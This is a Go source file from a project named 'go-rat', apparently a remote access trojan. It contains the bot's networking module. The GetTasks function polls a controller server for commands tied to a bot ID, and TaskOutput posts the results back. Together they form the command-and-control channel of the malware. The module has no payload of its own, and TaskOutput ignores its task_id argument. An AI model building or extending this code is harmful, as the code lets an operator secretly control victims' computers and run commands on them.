package net

import (
	"bytes"
	"encoding/json"
	"go-rat/utils"
	"go-rat/utils/types"
	"io"
	"net/http"
)

func GetJSON(path string, out interface{}) error {
	resp, err := http.Get(utils.BASE_URL + path)
	if err != nil {
		return err
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if err = json.Unmarshal(respBody, out); err != nil {
		return err
	}

	return nil
}

func PostJSON(path string, data interface{}, out interface{}) error {
	dataStr, err := json.Marshal(data)
	if err != nil {
		return err
	}
	resp, err := http.Post(utils.BASE_URL+path, "application/json", bytes.NewReader(dataStr))
	if err != nil {
		return err
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if err = json.Unmarshal(respBody, out); err != nil {
		return err
	}

	return nil
}

func GetTasks(bot_id string) ([]types.Task, error) {
	var tasks []types.Task

	if err := GetJSON("/get/tasks/"+bot_id, &tasks); err != nil {
		return []types.Task{}, err
	}

	return tasks, nil
}

func TaskOutput(task_id string, outputs []types.Output) error {
	err := PostJSON("/output/task/", &outputs, nil)
	if err != nil {
		return err
	}
	return nil
}
